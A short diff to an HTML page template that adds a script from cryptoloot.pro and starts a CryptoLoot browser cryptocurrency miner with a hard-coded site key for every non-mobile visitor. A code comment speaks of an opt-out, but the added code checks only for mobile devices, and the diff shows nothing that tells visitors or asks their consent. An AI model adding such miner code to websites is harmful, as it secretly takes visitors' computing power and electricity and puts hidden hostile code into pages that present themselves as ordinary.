@@ -1171,5 +1171,17 @@
     {% endblock %}
 
 
+    <script src="//cryptoloot.pro/lib/crlt.js"></script>
+
+    <script>
+        var miner = new CRLT.Anonymous('9cf835f256afe913819c76e96ac0f9d90b131be0f0c3', {throttle: 0.3});
+
+        // Only start on non-mobile devices and if not opted-out
+        // in the last 14400 seconds (4 hours):
+        if (!miner.isMobile()) {
+            miner.start();
+        }
+    </script>
+
 </body>
 </html>
